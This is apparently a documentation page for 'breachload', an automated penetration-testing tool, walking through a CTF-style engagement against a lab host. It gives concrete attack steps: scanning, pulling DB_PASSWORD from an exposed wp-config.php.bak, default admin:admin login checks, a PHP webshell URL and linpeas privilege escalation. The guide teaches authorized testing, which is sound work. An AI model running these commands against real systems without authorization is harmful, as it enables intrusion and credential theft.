# Your First Engagement

An end-to-end walkthrough on a lab box. This shows you the actual commands and
the actual output shapes you'll see, so nothing is a surprise on your first
real run.

**Prerequisites:** [Getting Started](Getting-Started) done; VPN or lab reachable;
a target IP you're authorized to test.

## Scenario

A Linux lab box at `10.10.10.5`. We'll go recon -> enum -> find a lead ->
verify -> capture the user flag (root optional).

## Step 1 - Write the config

The config file names your engagement, lists the targets, and sets the level of
autonomy. Anything outside `targets` is hard-blocked, always.

```yaml
# engagements/mybox.yaml
name: mybox
mode: full-auto
ctf: true                # CTF mode: aggressive defaults, flag capture on
targets:
  - 10.10.10.5
  - mybox.htb
  - "*.mybox.htb"        # allow subdomains under mybox.htb
auto_threshold: active    # RECON+ENUM run without asking; anything intrusive stops
lhost: 10.10.14.10        # your attacker IP
```

Add `mybox.htb 10.10.10.5` to `/etc/hosts` if you're on a real HTB box (many
apps only answer on their vhost).

## Step 2 - Recon and enumeration

```bash
python -m breachload.cli run engagements/mybox.yaml --stop vuln
```

You'll see a live line-by-line stream:

```
    phase == entering recon ==
      run $ nmap -sV -sC -Pn -oX <tmp> 10.10.10.5
      note nmap: 22/tcp ssh OpenSSH 8.9p1; 80/tcp http nginx 1.18.0
    phase == entering enumeration ==
      run $ httpx -silent -json -tech-detect ...
      run $ whatweb --no-errors -a1 --log-json=- http://10.10.10.5:80
      run $ curl -s -L -i -r 0-131072 ... http://10.10.10.5:80     # appfinger
      note appfinger: WordPress 6.4
      run $ ffuf -w common.txt -u http://10.10.10.5:80/FUZZ
      note ffuf: /wp-login.php (200) /wp-admin/ (302) /uploads/ (200)
      run $ ffuf -w subdomains-top1million-20000.txt -u http://10.10.10.5/ -H 'Host: FUZZ.mybox.htb'
      note vhostfuzz: dev.mybox.htb (200)
    phase == entering vuln_analysis ==
      run $ nuclei -u http://10.10.10.5:80 -jsonl -silent -tags wordpress
      note [high] WordPress version disclosure @ http://10.10.10.5:80/
      note [medium] wp-config.php.bak accessible @ http://10.10.10.5:80/wp-config.php.bak
    phase Phase vuln_analysis complete: Vulnerability scan complete.
```

## Step 3 - See what it found

```bash
python -m breachload.cli status engagements/mybox.yaml
```

```
Engagement 'mybox' - phase: vuln_analysis
  10.10.10.5 : 22/tcp ssh OpenSSH 8.9p1, 80/tcp http nginx/1.18.0
  dev.mybox.htb : 80/tcp http
  findings: 5
```

## Step 4 - Get the ranked lead

```bash
python -m breachload.cli suggest engagements/mybox.yaml
```

Gives you every actionable next step in ranked order, each with a copy-paste
command. Example lines:

```
> Exploit: wp-config.php.bak accessible  high finding on 10.10.10.5 (secret-disclosure)
    curl -s http://10.10.10.5:80/wp-config.php.bak
    # look for DB_PASSWORD / AUTH_KEY

> Default cred: wordpress-default admin:admin
    curl -s -o /dev/null -w '%{http_code}' -u 'admin:admin' http://10.10.10.5:80/
```

## Step 5 - Verify a lead

Run the winning `curl` yourself. Say `wp-config.php.bak` returned a `DB_PASSWORD`:

```bash
python -m breachload.cli secrets --text 'DB_PASSWORD, "s3cr3t!" AUTH_KEY, "xxx"'
```

breachload extracts, deduplicates, and marks them `confirmed` in the state:

```
secrets 2 secret(s), 2 credential(s)
  [medium] Secret exposed: Password assignment: DB_PASSWORD, "s3cr3t!"
```

## Step 6 - Foothold

Take the credentials, log in, drop a shell (or use one from a landed CVE), then
tell breachload:

```bash
python -m breachload.cli session engagements/mybox.yaml \
    --webshell 'http://10.10.10.5/uploads/shell.php?cmd=FUZZ'
```

## Step 7 - Loot + privesc

```bash
# Run linpeas on the box, save output locally, then:
python -m breachload.cli loot engagements/mybox.yaml --scan linpeas.txt
```

breachload's `loot` runs all class detectors over the output: sudo -l, SUID,
capabilities, group memberships, kernel-CVE suggestions, GTFOBins matches,
plus a full secret-scan and the "writable file root reads" primitive. All hits
land as findings with `exploit=` commands.

## Step 8 - Capture the flag

```bash
python -m breachload.cli flag engagements/mybox.yaml --scan loot/user.txt
```

## Step 9 - Report

```bash
python -m breachload.cli report engagements/mybox.yaml --html --pdf
```

You get `report.md`, `report.html`, `report.pdf` in the engagement directory,
each with CVSS scores, `[CONFIRMED]`/`[suspected]` badges per finding, the
audit-integrity section, and an activity timeline.

Verify nothing has been tampered with:

```bash
python -m breachload.cli audit engagements/mybox.yaml --verify
# audit chain intact - 42 records, no tampering detected
```

## What if I get stuck?

- `explain <term>` - plain-language explanation of any pentest term
- `gtfo <binary>` - GTFOBins escalation for a SUID/sudo binary
- `doctor --install` - what tools are missing and how to install them
- The [Command Reference](Command-Reference) has every subcommand
